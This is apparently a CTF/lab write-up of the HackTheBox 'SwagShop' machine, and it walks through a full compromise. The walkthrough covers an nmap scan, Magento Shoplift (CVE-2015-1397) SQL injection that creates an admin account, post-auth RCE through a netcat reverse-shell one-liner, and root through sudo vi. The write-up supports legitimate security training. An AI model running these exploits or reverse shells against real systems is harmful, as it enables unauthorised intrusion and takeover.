## Swagshop

### Lab Details 

- Difficulty: Easy
- Type: Web App, Magento, Priv Esc,  Linux


#### Tasks

Q1: How many TCP ports are open on SwagShop?
 - `nmap -sT -T4 -vv -A -p- -oA Swagshop 10.10.10.140`
 - 2
```
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgTCefp89MPJm2oaJqietdslSBur+eCMVQRW19iUL2DQSdZrIctssf/ws4HWN9DuXWB1p7OR9GWQhjeFv+xdb8OLy6EQ72zQOk+cNU9ANi72FZIkpD5A5vHUyhhUSUcnn6hwWMWW4dp6BFVxczAiutSWBVIm2YLmcqwOEOJhfXLVvsVqu8KUmybJQWFaJIeLVHzVgrF1623ekDXMwT7Ktq49RkmqGGE+e4pRy5pWlL2BPVcrSv9nMRDkJTXuoGQ53CRcp9VVi2V7flxTd6547oSPck1N+71Xj/x17sMBDNfwik/Wj3YLjHImAlHNZtSKVUT9Ifqwm973YRV9qtqtGT
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEG18M3bq7HSiI8XlKW9ptWiwOvrIlftuWzPEmynfU6LN26hP/qMJModcHS+idmLoRmZnC5Og9sj5THIf0ZtxPY=
|   256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINmmpsnVsVEZ9KB16eRdxpe75vnX8B/AZMmhrN2i4ES7
80/tcp    open     http    syn-ack     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
```


Q2: What is the name of the eCommerce Software being used by the website?
- `curl target_url` -> Magento
```
</div>
        <address class="copyright">&copy; 2014 Magento Demo Store. All Rights Reserved.</address>
    </div>
</div>
``` 

Q3: Which version of Magento is in use?
 - we can use magescan to finger print Magento
 - exmaple below
```
php magescan.phar scan:all http://swagshop.htb     
Scanning http://swagshop.htb/...

                       
  Magento Information  
                       

+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+
...
```


Q4: The Magento Shoplift vulnerability can be used to change the credentials of what user?
- according to https://www.exploit-db.com/exploits/37977
- the attack is targeting the admin account by performing SQL injection


Q5: 
 - Used https://github.com/Wytchwulf/CVE-2015-1397-Magento-Shoplift to exploit the vulnerability
 -  the repo contains two exploits, the first exploit creates a user as admin and the second exploit allow user to execute RCE
```
## clone the repo
git clone https://github.com/Wytchwulf/CVE-2015-1397-Magento-Shoplift
cd CVE-2015-1397-Magento-Shoplift

## run the first exploit which will create a new user with admin access
python3 exploit.py swagshop.htb  
Target URL:  http://swagshop.htb/index.php/admin/Cms_Wysiwyg/directive/index/
Encoded directive:  e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ
Encoded pfilter:  cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdmb3JtZScpICksIENPTkNBVCgnOicsIEBTQUxUICkpO1NFTEVDVCBARVhUUkEgOj0gTUFYKGV4dHJhKSBGUk9NIGFkbWluX3VzZXIgV0hFUkUgZXh0cmEgSVMgTk9UIE5VTEw7SU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgZmlyc3RuYW1lYCwgYGxhc3RuYW1lYCxgZW1haWxgLGB1c2VybmFtZWAsYHBhc3N3b3JkYCxgY3JlYXRlZGAsYGxvZ251bWAsYHJlbG9hZF9hY2xfZmxhZ2AsYGlzX2FjdGl2ZWAsYGV4dHJhYCxgcnBfdG9rZW5gLGBycF90b2tlbl9jcmVhdGVkX2F0YCkgVkFMVUVTICgnRmlyc3RuYW1lJywnTGFzdG5hbWUnLCdlbWFpbEBleGFtcGxlLmNvbScsJ2Zvcm1lJyxAUEFTUyxOT1coKSwwLDAsMSxARVhUUkEsTlVMTCwgTk9XKCkpO0lOU0VSVCBJTlRPIGBhZG1pbl9yb2xlYCAocGFyZW50X2lkLHRyZWVfbGV2ZWwsc29ydF9vcmRlcixyb2xlX3R5cGUsdXNlcl9pZCxyb2xlX25hbWUpIFZBTFVFUyAoMSwyLDAsJ1UnLChTRUxFQ1QgdXNlcl9pZCBGUk9NIGFkbWluX3VzZXIgV0hFUkUgdXNlcm5hbWUgPSAnZm9ybWUnKSwnRmlyc3RuYW1lJyk7
WORKED
Check swagshop.htb/index.php/admin with creds forme:forme
```
- run the second exploit to performs RCE as admin
-  however had some issue running the second exploit, kept on receiving error message `Tunnel URL not found.`
- started with debugging the script, tried inspecting every single variable and found that the exploit is trying to locate order/shipping details thats newer than 1 year
- the existing order are from 2019 which is way older than expected therefore we will need to create a new order on the system with the admin credentials
- example below: 
![[Sales_Order.png]]

![[Select_Customer.png]]
![[Fillin_Order.png]]

![[New_Order.png]]

- after we have created a new order, we can run the script as below
```
python3 post_auth.py http://swagshop.htb/index.php/admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 4444 >/tmp/f"
```
- shell as user www-data can be received

![[Shell_Back.png]]


Q6: Which binary can www-data run as root without a password?
- run `sudo -l` to check
- however we dont have a interactive shell so need to upgrade luckily theres python3 installed
```
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
$ 

    sudo vi -c ':!/bin/sh' /dev/null

$ $ sudo: no tty present and no askpass program specified
```
- since we can run vi as sudo in /var/www/html/* directory we can use below to exploit this
```
# open any file in /var/www/html directory with vi using sudo 
$: sudo vi /var/www/html/api.php 

# run below to invoke a new shell as sudo
:!/bin/bash
```



#### Lesson Learned
- Exploiting Magento 
- Exploiting vi 
